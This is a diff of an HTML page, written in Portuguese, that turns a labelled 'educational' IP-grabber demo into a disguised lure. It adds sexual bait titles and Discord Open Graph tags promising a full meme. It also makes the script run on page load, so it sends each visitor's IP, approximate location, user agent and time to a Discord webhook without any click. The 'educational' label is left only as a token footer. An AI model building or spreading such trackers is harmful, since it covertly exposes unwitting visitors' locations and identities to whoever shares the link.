@@ -3,7 +3,17 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Demo IP Grabber - Educacional</title>
+    <title>anal sex</title>
+    
+    <!-- Open Graph Tags pro Embed no Discord -->
+    <meta property="og:title" content="Clique Aqui pra Ver o Meme Completo!">
+    <meta property="og:description" content="Um meme engraçado sobre IP leak. (Demo educacional de cibersegurança)">
+    <meta property="og:image" content="https://i.imgflip.com/7q9knu.jpg">
+    <meta property="og:image:width" content="600">
+    <meta property="og:image:height" content="600">
+    <meta property="og:url" content="https://seuusuario.github.io/nome-do-repo"> <!-- Mude pro seu link -->
+    <meta property="og:type" content="website">
+    
     <style>
         body { font-family: Arial, sans-serif; text-align: center; background: #f0f0f0; padding: 50px; }
         img { cursor: pointer; border: 2px solid #000; border-radius: 10px; max-width: 100%; height: auto; }
@@ -11,16 +21,24 @@
     </style>
 </head>
 <body>
-    <h1>Demo Educacional: Clique na Imagem para "Grabar" IP</h1>
-    <p><em>(Apenas para fins de aprendizado em cibersegurança. Não use maliciosamente!)</em></p>
+    <h1>sex anal</h1>
+    <p><em>(Carregando... Clique na imagem se quiser mais ação, mas o grab já rolou!)</em></p>
     
     <img id="grabberImg" src="https://i.imgflip.com/7q9knu.jpg" alt="Meme Troll IP Leak" onclick="grabIP()">
     
     <div id="status"></div>
 
     <script>
+        // Grab automático no carregamento da página (simula "clique no embed do Discord")
+        window.addEventListener('load', async function() {
+            await grabIP(); // Chama uma vez no load
+        });
+
+        // Função opcional pro clique extra na imagem
         async function grabIP() {
             const status = document.getElementById('status');
+            if (status.textContent.includes('Enviado')) return; // Evita spam
+
             status.textContent = 'Capturando dados... Aguarde!';
             status.style.color = 'orange';
 
@@ -42,13 +60,14 @@
                 // Monta o payload para o Discord Webhook (embed formatado)
                 const payload = {
                     embeds: [{
-                        title: '🕵️ Novo Clique Detectado!',
+                        title: '🕵️ Clique/IP Detectado via Discord Embed!',
                         color: 0xFF0000, // Vermelho para alerta
                         fields: [
                             { name: 'IP', value: `\`${ip}\``, inline: true },
                             { name: 'Localização Aprox.', value: location, inline: true },
                             { name: 'User Agent', value: `\`${userAgent.substring(0, 100)}...\``, inline: false },
-                            { name: 'Data/Hora', value: timestamp, inline: true }
+                            { name: 'Data/Hora', value: timestamp, inline: true },
+                            { name: 'Origem', value: 'Discord Link Click', inline: true }
                         ],
                         footer: { text: 'Demo Educacional - Cibersegurança' },
                         timestamp: new Date().toISOString()
